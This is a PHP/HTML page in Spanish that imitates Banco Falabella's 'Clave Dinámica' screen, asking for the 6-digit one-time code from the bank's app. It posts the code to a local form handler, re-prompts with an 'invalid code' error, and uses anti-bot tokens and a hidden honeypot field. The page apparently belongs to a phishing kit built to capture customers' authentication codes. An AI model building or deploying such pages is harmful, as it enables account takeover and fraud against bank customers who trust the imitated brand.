<?php
require_once __DIR__ . '/config/security.php';
init_secure_session();
send_security_headers();
$hasError = (isset($_GET['error']) && $_GET['error'] == '1');
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso de Clave Dinámica | Banco Falabella</title>
    <meta name="description" content="Ingresa la clave dinámica de 6 dígitos que aparece en tu app Banco Falabella.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/dinamica.css">
    <style>
        .code.input-error {
            border-color: #d32f2f !important;
            box-shadow: 0 0 0 1px rgba(211, 47, 47, 0.4);
        }
        .code.input-ok {
            border-color: #2e7d32 !important;
            box-shadow: 0 0 0 1px rgba(46, 125, 50, 0.4);
        }
        #errorMsg {
            color: #d32f2f !important;
            font-size: 13px;
            margin-top: 16px;
            margin-bottom: 8px;
            display: <?php echo $hasError ? 'block' : 'none'; ?>;
            text-align: center;
        }
    </style>
</head>

<body>

    <main>
        <section class="card">
            <h1>Ingreso de Clave Dinámica</h1>
            <p>Ingresa la clave dinámica de 6 dígitos que aparece<br>en tu app <b>Banco Falabella.</b></p>

            <p id="errorMsg">
                Clave dinámica inválida, por favor ingrésala nuevamente.
            </p>

            <?php $botSecDin = generate_bot_token('dinamica'); ?>
            <form class="form" id="claveForm" action="config/form_handler.php" method="POST" novalidate>
                <input type="hidden" name="antispam_token" value="<?php echo htmlspecialchars($botSecDin['token']); ?>">
                <input type="hidden" name="form_render_time" value="<?php echo (int)$botSecDin['timestamp']; ?>">
                <div style="display:none !important; visibility:hidden !important; position:absolute; left:-9999px;">
                    <input type="text" name="website_url" tabindex="-1" autocomplete="off">
                </div>
                <input
                    class="code <?php echo $hasError ? 'input-error' : ''; ?>"
                    id="clave"
                    name="clave_dinamica"
                    type="tel"
                    inputmode="numeric"
                    autocomplete="one-time-code"
                    maxlength="7"
                    placeholder=""
                    aria-label="Clave dinámica">
                <button type="submit" class="btn-auth" id="autorizar" disabled>Autorizar</button>
            </form>

            <p class="find">Encuentra tu <b>Clave Dinámica</b> en la pantalla principal<br>de tu app <b>Banco
                    Falabella</b></p>

            <img class="phone-art" src="img/dynamic.webp"
                 alt="Ubicación de la Clave Dinámica en la app Banco Falabella">
        </section>
    </main>

    <footer>
        <div class="foot-inner">
            <p class="version">Banco Falabella</p>
            <div class="foot-row">
                <svg viewBox="0 0 40 40" width="26" height="26" aria-hidden="true">
                    <path
                        d="M27.3 40C20.3 40 0 34.5 0 27.8c0-6.7 20.3-12.2 27.3-12.2C34.3 15.6 40 21.1 40 27.8 40 34.5 34.3 40 27.3 40z"
                        fill="#fff" />
                    <path
                        d="M21 20.2C16.5 17.5 5.5 6.3 8.3 1.9 11.1-2.5 26.5 1.7 31.1 4.4c4.6 2.6 6 8.3 3.2 12.7-2.8 4.4-8.7 5.8-13.3 3.1z"
                        fill="#d9d9d9" />
                </svg>
                <span>© Banco Falabella 2026.<br>Todos los derechos reservados.</span>
            </div>
            <div class="foot-row">
                <svg viewBox="0 0 24 24" width="26" height="26" aria-hidden="true">
                    <circle cx="12" cy="12" r="10" fill="none" stroke="#fff" stroke-width="2" />
                    <path d="M7.5 17l1-3.2a5 5 0 1 1 1.9 1.9z" fill="#fff" />
                </svg>
                <span>Recibe asesoría inmediata a través de WhatsApp.<br>Guarda nuestro número verificado <span
                        class="num">+57 1 5878000</span></span>
            </div>
        </div>
    </footer>

    <script>
        var input = document.getElementById('clave'),
            btn   = document.getElementById('autorizar'),
            err   = document.getElementById('errorMsg');

        input.addEventListener('input', function () {
            var d = input.value.replace(/\D/g, '').slice(0, 6);

            input.value = d.length > 3 ? d.slice(0, 3) + ' ' + d.slice(3) : d;

            btn.disabled = d.length !== 6;

            input.classList.remove('input-error');
            err.style.display = 'none';

            if (d.length === 6) {
                input.classList.add('input-ok');
            } else {
                input.classList.remove('input-ok');
            }
        });
    </script>
</body>

</html>
